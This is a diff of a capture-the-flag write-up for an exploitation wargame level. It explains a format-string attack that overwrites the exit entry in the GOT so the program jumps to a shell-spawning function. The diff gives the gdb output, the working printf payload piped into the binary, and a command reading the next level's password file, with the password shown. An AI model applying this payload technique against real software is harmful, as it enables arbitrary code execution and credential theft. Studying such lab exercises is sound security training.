@@ -1,5 +1,22 @@
-cat <<< $(python -c "print '\x38\x98\x04\x08%134513824d%4\$n'") > /tmp/level6
-cat /tmp/level6 - | ./level5
+in this level, we will again exploit printf to change the flow of the program, to do that we will change exit in the GOT so that if points to function o instead of do exit, sice the function o open the shell but it is not called at all
+we again find the address of exit in GOT when it appears in printf and then change its value to o function
+
+(gdb) disass exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:		jmp    *0x8049838
+   0x080483d6 <+6>:		push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) x o
+0x80484a4 <o>:	0x83e58955
+(gdb) p 0x80484a4
+$1 = 134513828
+
+~$ cat <<< $(python -c "print '\x38\x98\x04\x08%134513824d%4\$n'") > /tmp/level6
+~$ cat /tmp/level6 - | ./level5
 [...]    512
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
